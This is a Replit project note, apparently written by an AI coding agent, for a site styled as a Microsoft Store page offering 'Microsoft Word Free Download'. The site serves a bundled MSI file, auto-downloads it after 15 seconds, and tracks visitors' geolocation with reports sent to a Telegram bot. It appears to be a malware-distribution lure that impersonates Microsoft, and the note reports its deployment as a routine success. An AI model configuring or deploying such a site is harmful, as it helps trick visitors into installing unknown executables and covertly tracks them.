# Microsoft Word Free Download - Replit Project

## Overview
This is a professional Microsoft Word download website with comprehensive analytics and tracking. The project has been successfully imported and configured for the Replit environment.

## Recent Changes
- **September 21, 2025**: Project imported from GitHub and fully configured for Replit
  - Installed all Node.js dependencies
  - Configured Express server to run on 0.0.0.0:5000
  - Tested all API endpoints and frontend functionality
  - Set up autoscale deployment configuration
  - Verified download functionality for MSI file

## Project Architecture

### Backend (Express.js Server)
- **File**: `server.js`
- **Port**: 5000 (configured for Replit)
- **Host**: 0.0.0.0 (allows proxy access)
- **API Endpoints**:
  - `/api/product/info` - Product information
  - `/api/download/word-free` - MSI file download
- **Features**:
  - Telegram analytics integration
  - User tracking and geolocation
  - Download monitoring
  - CORS enabled
  - Production-ready error handling

### Frontend
- **Type**: Static HTML/CSS/JS (Microsoft Store template)
- **Served from**: `client/` directory
- **Features**:
  - Auto-download functionality (15-second timer)
  - Manual download button
  - Real-time product info loading
  - Microsoft Store design
  - Responsive layout

### File Structure
```
/
├── server.js              # Main Express server
├── package.json           # Dependencies and scripts
├── client/                # Frontend static files
│   ├── index.html         # Main page
│   ├── css/              # Stylesheets
│   ├── js/               # JavaScript files
│   ├── images/           # Images and icons
│   ├── fonts/            # Font files
│   └── public/           # Downloads (MSI file)
├── api/                  # Serverless functions
├── deployment configs/   # Multiple platform configs
└── replit.md            # This documentation
```

## Deployment Configuration
- **Target**: Autoscale (stateless website)
- **Run Command**: `npm start`
- **Port**: 5000
- **Build**: Not required (static files served directly)

## Environment Variables
- `NODE_ENV`: development/production
- `PORT`: 5000 (default)
- `TELEGRAM_BOT_TOKEN`: (optional) For analytics
- `TELEGRAM_CHAT_ID`: (optional) For notifications

## User Preferences
*No specific user preferences configured yet*

## Development Notes
- The project uses a single Express server that serves both static files and API endpoints
- No separate Vite dev server needed - everything works through Express
- MSI file (16.6MB) is included and properly served
- Telegram logging is configured but optional
- Multiple deployment platforms supported (Vercel, Netlify, Heroku, Railway, Render)

## Status
✅ **Fully Functional**: All features working correctly in Replit environment
- Backend server running on 0.0.0.0:5000
- API endpoints responding properly
- Frontend loading and displaying correctly
- Download functionality working
- Auto-download timer functioning
- Analytics tracking operational